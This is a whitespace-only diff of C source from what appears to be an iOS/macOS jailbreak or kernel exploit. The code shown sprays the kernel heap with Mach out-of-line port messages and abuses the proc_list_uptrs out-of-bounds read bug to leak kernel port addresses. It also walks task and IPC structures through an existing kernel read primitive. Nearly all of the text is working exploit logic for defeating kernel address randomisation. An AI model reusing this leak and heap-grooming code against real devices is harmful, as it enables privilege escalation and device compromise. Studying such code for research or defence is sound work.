@@ -58,18 +58,18 @@ static void fill_events(int n_events)
         .ident = 1,
         .flags = EV_ADD,
         .udata = 0x2345 } };
-    
+
     kqueue_id_t id = 0x1234;
-    
+
     for (int i = 0; i < n_events; i++) {
         int err = kevent_id(id, events_id, 1, NULL, 0, NULL, NULL,
                             KEVENT_FLAG_WORKLOOP | KEVENT_FLAG_IMMEDIATE);
-        
+
         if (err != 0) {
             DEBUG("failed to enqueue user event");
             exit(EXIT_FAILURE);
         }
-        
+
         events_id[0].ident++;
     }
 }
@@ -96,16 +96,16 @@ static uint64_t try_leak(int count)
 {
     int buf_size = (count * 8) + 7;
     char* buf = calloc(buf_size + 1, 1);
-    
+
     int err = proc_list_uptrs(getpid(), (void*)buf, buf_size);
-    
+
     if (err == -1) {
         return 0;
     }
-    
+
     // the last 7 bytes will contain the leaked data:
     uint64_t last_val = ((uint64_t*)buf)[count]; // we added an extra zero byte in the calloc
-    
+
     return last_val;
 }
 
@@ -127,29 +127,29 @@ static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int co
         DEBUG("failed to allocate port");
         exit(EXIT_FAILURE);
     }
-    
+
     mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
     for (int i = 0; i < count; i++) {
         ports[i] = target_port;
     }
-    
+
     struct ool_msg* msg = calloc(1, sizeof(struct ool_msg));
-    
+
     msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
     msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
     msg->hdr.msgh_remote_port = q;
     msg->hdr.msgh_local_port = MACH_PORT_NULL;
     msg->hdr.msgh_id = 0x41414141;
-    
+
     msg->body.msgh_descriptor_count = 1;
-    
+
     msg->ool_ports.address = ports;
     msg->ool_ports.count = count;
     msg->ool_ports.deallocate = 0;
     msg->ool_ports.disposition = disposition;
     msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
     msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
-    
+
     err = mach_msg(&msg->hdr,
                    MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
                    (mach_msg_size_t)sizeof(struct ool_msg),
@@ -157,12 +157,12 @@ static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int co
                    MACH_PORT_NULL,
                    MACH_MSG_TIMEOUT_NONE,
                    MACH_PORT_NULL);
-    
+
     if (err != KERN_SUCCESS) {
         DEBUG("failed to send message: %s", mach_error_string(err));
         exit(EXIT_FAILURE);
     }
-    
+
     return q;
 }
 
@@ -182,35 +182,35 @@ static int uint64_t_compare(const void* a, const void* b)
 uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition)
 {
     prepare_kqueue();
-    
+
     int n_guesses = 100;
     uint64_t* guesses = calloc(1, n_guesses * sizeof(uint64_t));
     int valid_guesses = 0;
-    
+
     for (int i = 1; i < n_guesses + 1; i++) {
         mach_port_t q = fill_kalloc_with_port_pointer(port, i, disposition);
         mach_port_destroy(mach_task_self(), q);
         uint64_t leaked = try_leak(i - 1);
         //DEBUG("leaked %016llx", leaked);
-        
+
         // a valid guess is one which looks a bit like a kernel heap pointer
         // without the upper byte:
         if ((leaked < 0x00ffffff00000000) && (leaked > 0x00ffff0000000000)) {
             guesses[valid_guesses++] = leaked | 0xff00000000000000;
         }
     }
-    
+
     if (valid_guesses == 0) {
         DEBUG("couldn't leak any kernel pointers");
         exit(EXIT_FAILURE);
     }
-    
+
     // return the most frequent guess
     qsort(guesses, valid_guesses, sizeof(uint64_t), uint64_t_compare);
-    
+
     uint64_t best_guess = guesses[0];
     int best_guess_count = 1;
-    
+
     uint64_t current_guess = guesses[0];
     int current_guess_count = 1;
     for (int i = 1; i < valid_guesses; i++) {
@@ -225,27 +225,27 @@ uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition)
             current_guess_count = 1;
         }
     }
-    
+
     //DEBUG("best guess is: 0x%016llx with %d%% of the valid guesses for it", best_guess, (best_guess_count*100)/valid_guesses);
-    
+
     free(guesses);
-    
+
     return best_guess;
 }
 
 uint64_t find_port_via_kmem_read(mach_port_name_t port)
 {
     uint64_t task_port_addr = task_self_addr();
-    
+
     uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    
+
     uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
-    
+
     uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
-    
+
     uint32_t port_index = port >> 8;
     const int sizeof_ipc_entry_t = 0x18;
-    
+
     uint64_t port_addr = ReadKernel64(is_table + (port_index * sizeof_ipc_entry_t));
     return port_addr;
 }
@@ -257,4 +257,3 @@ uint64_t find_port_address(mach_port_t port, int disposition)
     }
     return find_port_via_proc_pidlistuptrs_bug(port, disposition);
 }
-
